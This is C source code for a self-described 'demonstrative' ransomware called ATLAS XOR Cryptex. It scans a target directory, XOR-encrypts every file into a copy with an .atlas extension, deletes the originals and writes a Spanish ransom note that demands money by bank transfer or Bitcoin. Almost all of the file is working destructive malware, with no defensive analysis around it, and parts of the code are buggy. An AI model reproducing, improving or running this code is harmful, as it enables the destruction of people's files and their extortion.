/* 
	 
        _   _                                   _            
   __ _| |_| | __ _ ___    ___ _ __ _   _ _ __ | |_ _____  __
  / _` | __| |/ _` / __|  / __| '__| | | | '_ \| __/ _ \ \/ /
 | (_| | |_| | (_| \__ \ | (__| |  | |_| | |_) | ||  __/>  < 
  \__,_|\__|_|\__,_|___/  \___|_|   \__, | .__/ \__\___/_/\_\
                                    |___/|_|                 

	 
	 ATLAS XOR Cryptex es un ramsomware de tipo demostrativo el cual cifra archivos usando el sistema XOR convencional
	 en combinacion de una pasada XOR combinacional de segunda ronda de una key periodicamente preestablecida con 
	 claves de coma flotante .
	 
	 La funcion de autoreplicación y escaneo de directorios para cifrado automatico de disco esta deshabilitado
	 por propositos de solo enseñanza de como trabaja un mecanismo semicomplejo de ransomware.
	 
	 En esta version el escaneo de ficheros en determinados directorios esta activado y cifrara cualquier archivo
	 en su interior.
	 
	 ****************************************************************																			||
	|||------------------------------------------------------------|||
	||| Available in amd64, i386, armhf,ARM, RISC, Itanium:	       |||
	||| Juan Carlos Lanuza L. | MGA > 3/02/2017 		       |||
	||| ATLAS Laboratories | Cryptography Research Laboratory      |||
	|||------------------------------------------------------------|||																							||
	 ****************************************************************	
*/

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <dirent.h>
#include <sys/types.h>

#define AND &
#define XOR ^
#define NOT !

int i = 0;

FILE *buffer;
FILE *ciphered;
FILE *readme;
float sharedkey[10] = {0.65,100,0.365,0,25.9,999,5,12.58,7.0214,103.126};
float precalculated;

char path[] = {"C:/test"};

struct data_chars {
	char current_char;
	char ciphered_char;
	char pre_ciphered_char;	
} data; 

struct cipher_attrib {
	int password;
	char file[500];
	char c_file[500];
	char readmsg[500];
} c_attrib;

int main(void)
{
	DIR *dirp;
  struct dirent *direntp;
	c_attrib.password = 900;
	
	dirp = opendir(path);
 	if (dirp == NULL)
 	{
 		fprintf(stderr, "Error: No se puede abrir el directorio\n", perror);
 		exit(EXIT_FAILURE);
 	}
	while ((direntp = readdir(dirp)) != NULL)
 	{
	  fprintf(stdout, "Identificando Archivo %s\n", direntp -> d_name);
 	  strcpy(c_attrib.file, path);
 	  strcat(c_attrib.file, "/");
 	  strcat(c_attrib.file, direntp -> d_name);
 	  strcpy(c_attrib.c_file, path);
 	  strcat(c_attrib.c_file, "/");
 		
		if((strcmp(direntp -> d_name, ".") == 0)  && (strcmp(direntp -> d_name, "..") == 0))
		{
			fprintf(stderr, "Saltando Archivo %s", c_attrib.file);
		}
		else
		if((strcmp(direntp -> d_name, ".") != 0)  && (strcmp(direntp -> d_name, "..") != 0))
		{
			
			buffer = fopen(c_attrib.file, "r"); /* Abre el archivo a Cifrar */
 			if(buffer == NULL) 
			{
				fputs("Error abriendo archivo o no existe !", stderr);
				exit(EXIT_FAILURE);
			}
			strcat(c_attrib.c_file, direntp -> d_name);
			strcat(c_attrib.c_file, ".atlas");
 			ciphered = fopen(c_attrib.c_file, "w+"); /* Crea archivo cifrado */
			if(ciphered == NULL) 
			{
				fputs("Error abriendo archivo cifrador", stderr); 
				exit(EXIT_FAILURE);
			}
			while(!(feof(buffer))) 
			{											
				data.current_char = fgetc(buffer);
				data.pre_ciphered_char = (char)((int)data.current_char XOR c_attrib.password);
				for(i = 0;i <= 10;i++)
				precalculated = (sharedkey[i] * c_attrib.password);
				data.ciphered_char = (char)((int)data.pre_ciphered_char XOR (int)precalculated);
				fputc(data.ciphered_char,ciphered);
			}
			fclose(buffer);
			fclose(ciphered);
 	  	strcpy(c_attrib.file, path);
 	  	strcat(c_attrib.file, "/");
 	  	strcat(c_attrib.file, direntp -> d_name);
			remove(c_attrib.file);	
		}
	}
	strcat(c_attrib.readmsg, path);
	strcat(c_attrib.readmsg, "/");
	strcat(c_attrib.readmsg, "README.txt");
	readme = fopen(c_attrib.readmsg,"w+");
	fprintf(readme,
					"\t-------------------------------------\n"
					"\t-This is the ATLAS XOR Cryptex Virus-\n"
					"\t-------------------------------------\n\n\n"
					"\t------------------------------------------------------------------------------------------\n"
					"\tSi quieres recuperar tu información Valiosa\n"
					"\tsolo necesitas depositar 5000 $ USD 4390 Euros\n"
					"\ten el banco LAFISE en Nicaragua con el numero \n"
					"\tde cuenta 787562312 con su nombre de instutucion y datos\n"
					"\tpara poder darte la clave de decifrado o mandar 3.5BTC\n"
					"\tal siguiente monedero virtual BIgbUh98Sas3&ndfScyiuhIUg454\n\n\n"
					"\tRecuerda tu Información esta en juego, no aceptar el proceder al pago y tu informacion\n"
					"\testara completamente perdida\n"
					"\t------------------------------------------------------------------------------------------\n\n\n"
					"\tATLAS\n\n");
	fclose(readme);				
	return 0;
}
